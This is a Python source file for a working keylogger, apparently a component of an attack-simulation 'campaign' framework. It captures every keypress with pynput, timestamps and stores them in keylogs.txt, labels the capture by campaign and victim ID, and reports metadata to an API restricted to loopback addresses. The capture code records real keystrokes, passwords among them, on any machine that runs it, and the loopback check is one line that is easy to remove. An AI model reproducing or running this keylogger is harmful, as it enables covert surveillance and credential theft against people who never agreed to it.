"""Container-local keyboard capture with bounded, retryable metadata sync."""

from __future__ import annotations

from dataclasses import dataclass
from datetime import datetime, timezone
import logging
import os
from pathlib import Path
import queue
import re
import signal
import threading
import time
from urllib.parse import urlparse


logger = logging.getLogger("bitm.keylogger")

KEYLOG_FILENAME = "keylogs.txt"
KEYLOG_ARCHIVE_FILENAME = "keylogs.previous.txt"
DEFAULT_FLUSH_SECONDS = 5.0
DEFAULT_TIMESTAMP_SECONDS = 15.0
DEFAULT_MAX_FILE_BYTES = 5 * 1024 * 1024
MAX_SYNC_BACKOFF_SECONDS = 30.0
SAFE_IDENTIFIER = re.compile(r"^[A-Za-z0-9_-]+$")
IGNORED_KEY_NAMES = {
    "alt",
    "alt_gr",
    "alt_l",
    "alt_r",
    "caps_lock",
    "cmd",
    "cmd_l",
    "cmd_r",
    "ctrl",
    "ctrl_l",
    "ctrl_r",
    "num_lock",
    "scroll_lock",
    "shift",
    "shift_l",
    "shift_r",
}


def utc_timestamp() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


@dataclass(frozen=True)
class Config:
    storage_path: Path
    campaign_api_url: str
    campaign_id: str
    victim_id: str
    flush_seconds: float
    timestamp_seconds: float
    max_file_bytes: int

    @property
    def log_file(self) -> Path:
        return self.storage_path / KEYLOG_FILENAME

    @property
    def archive_file(self) -> Path:
        return self.storage_path / KEYLOG_ARCHIVE_FILENAME

    @property
    def sync_url(self) -> str:
        return (
            f"{self.campaign_api_url.rstrip('/')}/{self.victim_id}/data"
        )


def _positive_float(name: str, default: float) -> float:
    raw_value = os.getenv(name, str(default))
    try:
        value = float(raw_value)
    except ValueError as exc:
        raise RuntimeError(f"{name} must be a number") from exc
    if value <= 0:
        raise RuntimeError(f"{name} must be greater than zero")
    return value


def _positive_int(name: str, default: int) -> int:
    raw_value = os.getenv(name, str(default))
    try:
        value = int(raw_value)
    except ValueError as exc:
        raise RuntimeError(f"{name} must be an integer") from exc
    if value <= 0:
        raise RuntimeError(f"{name} must be greater than zero")
    return value


def load_config() -> Config:
    campaign_id = os.getenv("CAMPAIGN_ID", "")
    victim_id = os.getenv("VICTIM_ID", "")
    for name, value in (
        ("CAMPAIGN_ID", campaign_id),
        ("VICTIM_ID", victim_id),
    ):
        if not SAFE_IDENTIFIER.fullmatch(value):
            raise RuntimeError(f"{name} is missing or invalid")

    campaign_api_url = os.getenv(
        "CAMPAIGN_API_URL",
        "http://127.0.0.1:8080",
    )
    parsed_url = urlparse(campaign_api_url)
    if (
        parsed_url.scheme != "http"
        or parsed_url.hostname not in {"127.0.0.1", "localhost", "::1"}
        or parsed_url.username
        or parsed_url.password
        or parsed_url.query
        or parsed_url.fragment
    ):
        raise RuntimeError("CAMPAIGN_API_URL must be a loopback HTTP URL")

    return Config(
        storage_path=Path(os.getenv("STORAGE_PATH", "/storage")),
        campaign_api_url=campaign_api_url,
        campaign_id=campaign_id,
        victim_id=victim_id,
        flush_seconds=_positive_float(
            "KEYLOG_FLUSH_SECONDS",
            DEFAULT_FLUSH_SECONDS,
        ),
        timestamp_seconds=_positive_float(
            "KEYLOG_TIMESTAMP_SECONDS",
            DEFAULT_TIMESTAMP_SECONDS,
        ),
        max_file_bytes=_positive_int(
            "KEYLOG_MAX_FILE_BYTES",
            DEFAULT_MAX_FILE_BYTES,
        ),
    )


class KeyBuffer:
    """Thread-safe in-memory key buffer."""

    def __init__(self, timestamp_seconds: float):
        self._timestamp_seconds = timestamp_seconds
        self._last_marker = time.monotonic()
        self._parts: list[str] = []
        self._lock = threading.Lock()

    def append(self, text: str) -> None:
        if not text:
            return
        now = time.monotonic()
        with self._lock:
            if now - self._last_marker >= self._timestamp_seconds:
                self._parts.append(f"\n[TIMESTAMP {utc_timestamp()}]\n")
                self._last_marker = now
            self._parts.append(text)

    def drain(self) -> str:
        with self._lock:
            content = "".join(self._parts)
            self._parts.clear()
            return content

    def restore(self, content: str) -> None:
        if not content:
            return
        with self._lock:
            self._parts.insert(0, content)


class MetadataSyncWorker:
    """Synchronize only the latest keylog metadata with bounded memory use."""

    def __init__(self, sync_url: str):
        self._sync_url = sync_url
        self._queue: queue.Queue[dict] = queue.Queue(maxsize=1)
        self._stop_event = threading.Event()
        self._thread = threading.Thread(
            target=self._run,
            name="keylog-metadata-sync",
            daemon=True,
        )

    def start(self) -> None:
        self._thread.start()

    def submit(self, payload: dict) -> None:
        try:
            self._queue.put_nowait(payload)
            return
        except queue.Full:
            pass

        try:
            self._queue.get_nowait()
        except queue.Empty:
            pass
        try:
            self._queue.put_nowait(payload)
        except queue.Full:
            # Another producer already submitted fresher metadata.
            pass

    def stop(self, timeout: float = 2.0) -> None:
        self._stop_event.set()
        self._thread.join(timeout=timeout)

    def _run(self) -> None:
        try:
            import requests
        except ImportError:
            logger.exception("The requests package is required for metadata sync")
            return

        session = requests.Session()
        pending: dict | None = None
        backoff = 1.0
        try:
            while True:
                if pending is None:
                    try:
                        if self._stop_event.is_set():
                            pending = self._queue.get_nowait()
                        else:
                            pending = self._queue.get(timeout=0.5)
                    except queue.Empty:
                        if self._stop_event.is_set():
                            break
                        continue

                try:
                    response = session.post(
                        self._sync_url,
                        json=pending,
                        timeout=5,
                    )
                    response.raise_for_status()
                except requests.RequestException as exc:
                    logger.warning(
                        "Keylog metadata sync failed; retrying in %.0fs: %s",
                        backoff,
                        exc,
                    )
                    if self._stop_event.is_set() or self._stop_event.wait(backoff):
                        break
                    backoff = min(
                        backoff * 2,
                        MAX_SYNC_BACKOFF_SECONDS,
                    )
                    try:
                        pending = self._queue.get_nowait()
                    except queue.Empty:
                        pass
                    continue

                logger.debug("Keylog metadata synchronized")
                pending = None
                backoff = 1.0
        finally:
            session.close()


class KeylogRecorder:
    def __init__(
        self,
        config: Config,
        sync_worker: MetadataSyncWorker,
    ):
        self.config = config
        self.buffer = KeyBuffer(config.timestamp_seconds)
        self.sync_worker = sync_worker
        self._flush_lock = threading.Lock()

    def initialize(self) -> None:
        self.config.storage_path.mkdir(parents=True, exist_ok=True)
        self.config.log_file.touch(exist_ok=True)
        self.config.log_file.chmod(0o644)
        self._append_text(
            f"\n[SESSION STARTED {utc_timestamp()}]\n"
        )
        self._submit_metadata()

    def record(self, text: str) -> None:
        self.buffer.append(text)

    def flush(self) -> bool:
        with self._flush_lock:
            content = self.buffer.drain()
            if not content:
                return False
            try:
                self._append_text(content)
            except OSError:
                self.buffer.restore(content)
                logger.exception("Failed to persist buffered keylog data")
                return False
            self._submit_metadata()
            return True

    def _append_text(self, content: str) -> None:
        encoded_size = len(content.encode("utf-8"))
        current_size = (
            self.config.log_file.stat().st_size
            if self.config.log_file.exists()
            else 0
        )
        prefix = ""
        if current_size and current_size + encoded_size > self.config.max_file_bytes:
            self.config.archive_file.unlink(missing_ok=True)
            self.config.log_file.replace(self.config.archive_file)
            self.config.log_file.touch()
            self.config.log_file.chmod(0o644)
            prefix = f"[KEYLOG ROTATED {utc_timestamp()}]\n"

        output = f"{prefix}{content}"
        encoded_output = output.encode("utf-8")
        if len(encoded_output) > self.config.max_file_bytes:
            encoded_output = encoded_output[-self.config.max_file_bytes:]
            while encoded_output and encoded_output[0] & 0xC0 == 0x80:
                encoded_output = encoded_output[1:]
            output = encoded_output.decode("utf-8", errors="replace")

        with self.config.log_file.open("a", encoding="utf-8") as stream:
            stream.write(output)
            stream.flush()

    def _submit_metadata(self) -> None:
        try:
            file_size = self.config.log_file.stat().st_size
        except OSError:
            logger.exception("Unable to stat keylog file")
            return
        self.sync_worker.submit(
            {
                "data_type": "keylog",
                "file_path": KEYLOG_FILENAME,
                "file_size_bytes": file_size,
                "extra_metadata": {
                    "last_update": utc_timestamp(),
                    "format": "text/plain; charset=utf-8",
                },
            }
        )


def key_to_text(key, key_enum) -> str:
    character = getattr(key, "char", None)
    if character is not None:
        return character if character.isprintable() else ""
    if key == key_enum.space:
        return " "
    if key == key_enum.enter:
        return "\n"
    if key == key_enum.tab:
        return "\t"
    if key == key_enum.backspace:
        return "[BACKSPACE]"
    name = getattr(key, "name", None)
    if name in IGNORED_KEY_NAMES:
        return ""
    return f"[{str(name or key).upper()}]"


def run_periodic_flush(
    recorder: KeylogRecorder,
    stop_event: threading.Event,
) -> None:
    while not stop_event.wait(recorder.config.flush_seconds):
        recorder.flush()


def main() -> int:
    from pynput.keyboard import Key, Listener

    logging.basicConfig(
        level=os.getenv("KEYLOG_LOG_LEVEL", "INFO").upper(),
        format="%(asctime)s %(levelname)s %(name)s: %(message)s",
    )
    config = load_config()
    sync_worker = MetadataSyncWorker(config.sync_url)
    recorder = KeylogRecorder(config, sync_worker)
    stop_event = threading.Event()
    listener: Listener | None = None

    def request_shutdown(_signum=None, _frame=None) -> None:
        stop_event.set()
        if listener is not None:
            listener.stop()

    signal.signal(signal.SIGTERM, request_shutdown)
    signal.signal(signal.SIGINT, request_shutdown)

    recorder.initialize()
    sync_worker.start()
    flush_thread = threading.Thread(
        target=run_periodic_flush,
        args=(recorder, stop_event),
        name="keylog-periodic-flush",
        daemon=True,
    )
    flush_thread.start()

    logger.info(
        "Keyboard capture started for campaign=%s victim=%s",
        config.campaign_id,
        config.victim_id,
    )

    try:
        listener = Listener(
            on_press=lambda key: recorder.record(key_to_text(key, Key)),
        )
        listener.start()
        listener.join()
    except KeyboardInterrupt:
        request_shutdown()
    finally:
        stop_event.set()
        flush_thread.join(timeout=config.flush_seconds + 1)
        recorder.flush()
        sync_worker.stop()
        logger.info("Keyboard capture stopped")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
